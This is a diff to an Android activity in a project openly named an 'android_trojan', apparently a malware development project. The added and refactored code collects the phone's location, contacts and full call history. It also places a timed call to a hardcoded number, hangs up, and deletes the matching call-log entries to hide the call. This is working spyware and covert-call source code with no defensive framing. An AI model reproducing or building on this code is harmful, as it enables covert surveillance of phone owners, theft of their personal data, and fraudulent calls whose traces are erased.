@@ -2,22 +2,18 @@ package trojan.android.android_trojan;
 
 import android.app.Activity;
 import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.location.Criteria;
 import android.location.Location;
-import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
-import android.widget.Toast;
 
 import java.util.ArrayList;
 
@@ -29,6 +25,7 @@ public class second_activity extends Activity {
     private Button button21;
     private Button button22;
     private Button button23;
+    private Button button24;
 
 
     @Override
@@ -38,30 +35,35 @@ public class second_activity extends Activity {
         button21 = (Button) findViewById(R.id.button21);
         button22 = (Button) findViewById(R.id.button22);
         button23 = (Button) findViewById(R.id.button23);
+        button24 = (Button) findViewById(R.id.button24);
+
         button21.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                GetLocation();
+                getLocation();
             }
         });
-
         button22.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                Contacts();
+                getContacts();
             }
         });
-
         button23.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                Call("0628470850", 20000);
+                call("0628470850", 20000);
             }
         });
-
+        button24.setOnClickListener(new View.OnClickListener(){
+            @Override
+            public void onClick(View v) {
+                ArrayList<String[]> calllog = (ArrayList<String[]>) getCallLog();
+            }
+        });
     }
 
-    public double[] GetLocation(){
+    public double[] getLocation(){
         //Get location manager
         LocationManager locManager = (LocationManager)getSystemService(LOCATION_SERVICE);
         //get the best provider to obtain the current location
@@ -81,7 +83,7 @@ public class second_activity extends Activity {
     }
 
 
-    public ArrayList Contacts(){
+    public ArrayList getContacts(){
         ContentResolver cr = getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
@@ -109,29 +111,57 @@ public class second_activity extends Activity {
         return contacts;
     }
 
-    public void Call(String num, long time){
-        Intent intent = new Intent(Intent.ACTION_CALL);
-        intent.setData(Uri.parse("tel:"+num));
-        startActivity(intent);
-        Log.d(TAG, "Start call");
-        PhoneStateReceiver test = new PhoneStateReceiver();
-        Tools.sleep(time);
-        test.onReceive(this.getApplicationContext(), intent);
-        test.killCall(this.getApplicationContext());
-        Log.d(TAG, "Stop call");
+    public void call(String num, long time){
+        if (time > 1000){
+            Intent intent = new Intent(Intent.ACTION_CALL);
+            intent.setData(Uri.parse("tel:"+num));
+            startActivity(intent);
+            Log.d(TAG, "Start call");
+            PhoneStateReceiver test = new PhoneStateReceiver();
+            Tools.sleep(time);
+            test.onReceive(this.getApplicationContext(), intent);
+            test.killCall(this.getApplicationContext());
+            Log.d(TAG, "Stop call");
+            Tools.sleep(1000);
+            deleteCallLog(num);
+        }
 
-        try {
-            String strNumberOne[] = { num };
-            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
-            boolean bol = cursor.moveToFirst();
-            if (bol) {
-                do {
-                    int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
-                    getContentResolver().delete(Uri.withAppendedPath(CallLog.Calls.CONTENT_URI, String.valueOf(idOfRowToDelete)), "", null);
-                } while (cursor.moveToNext());
-            }
-        } catch (Exception ex) {
-            System.out.print("Exception here ");
+    }
+
+    public ArrayList getCallLog(){
+        ArrayList<String[]> callLog = new ArrayList<String[]>();
+        String columns[]=new String[] {
+                CallLog.Calls._ID,
+                CallLog.Calls.NUMBER,
+                CallLog.Calls.DATE,
+                CallLog.Calls.DURATION,
+                CallLog.Calls.TYPE};
+        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
+        if (cursor.moveToFirst()){
+             do {
+                 callLog.add(new String[]{
+                         cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)),
+                         cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)),
+                         cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)),
+                         cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)),
+                         cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)),
+                 });
+            } while (cursor.moveToNext());
+        }
+        return callLog;
+    }
+
+    public void deleteCallLog(String num){
+        String strNumberOne[] = { num };
+        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, CallLog.Calls.NUMBER + " = ? ", strNumberOne, "");
+        if (cursor.moveToFirst()){
+            do {
+                int idOfRowToDelete = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
+                getContentResolver().delete(
+                        CallLog.Calls.CONTENT_URI,
+                        CallLog.Calls._ID + "= ? ",
+                        new String[] { String.valueOf(idOfRowToDelete) });
+            } while (cursor.moveToNext());
         }
     }
 }
